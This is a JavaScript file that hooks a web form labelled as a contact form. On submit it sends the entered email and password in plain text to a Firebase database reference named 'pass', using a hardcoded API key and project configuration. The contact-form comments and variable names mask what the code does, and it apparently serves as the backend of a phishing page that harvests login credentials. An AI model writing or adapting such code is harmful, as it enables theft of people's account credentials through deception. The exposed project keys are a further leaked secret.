const firebaseConfig = {
    //   copy your firebase config informations
    apiKey: "AIzaSyAIR_vj_SvZymVGHsabj5fQ6LrrjHuidZY",
    authDomain: "pass-74301.firebaseapp.com",
    databaseURL: "https://pass-74301-default-rtdb.firebaseio.com",
    projectId: "pass-74301",
    storageBucket: "pass-74301.appspot.com",
    messagingSenderId: "1000690456984",
    appId: "1:1000690456984:web:869f657de438b02d89b3ed"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var contactFormDB = firebase.database().ref("pass");
  
  document.getElementById("contactForm").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var name = getElementVal("email");
    var emailid = getElementVal("password");
  
    saveMessages(name, emailid);
  
    //   enable alert
    document.querySelector(".alert").style.display = "block";
  
    //   remove the alert
    setTimeout(() => {
      document.querySelector(".alert").style.display = "none";
    }, 3000);
  
    //   reset the form
    document.getElementById("contactForm").reset();
  }
  
  const saveMessages = (email, password) => {
    var newContactForm = contactFormDB.push();
  
    newContactForm.set({
      email: email,
      password: password,
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };